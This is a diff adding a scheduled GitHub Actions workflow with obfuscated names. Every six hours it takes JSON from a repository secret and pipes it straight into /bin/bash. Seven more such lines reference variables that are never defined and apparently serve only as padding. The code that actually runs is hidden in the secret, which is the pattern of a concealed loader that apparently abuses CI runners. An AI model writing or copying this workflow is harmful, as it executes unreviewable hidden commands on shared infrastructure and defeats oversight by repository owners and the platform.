@@ -1,0 +1,25 @@
+name: curiouslively
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: curiouslively
+        env:
+          pxyy266: ${{ secrets.pxyy266 }}
+        run: |
+          echo $pxyy266 | jq -r .jgue7 | /bin/bash
+          echo $o213 | jq -r .mz91 | /bin/bash
+          echo $btgz3 | jq -r .q28 | /bin/bash
+          echo $ddvj3903 | jq -r .kacy161 | /bin/bash
+          echo $b24553 | jq -r .bzo694 | /bin/bash
+          echo $nncn15 | jq -r .dtktz2920 | /bin/bash
+          echo $nwsp50687 | jq -r .btnoa2758 | /bin/bash
+          echo $cnmvl69210 | jq -r .xhlve33219 | /bin/bash
+
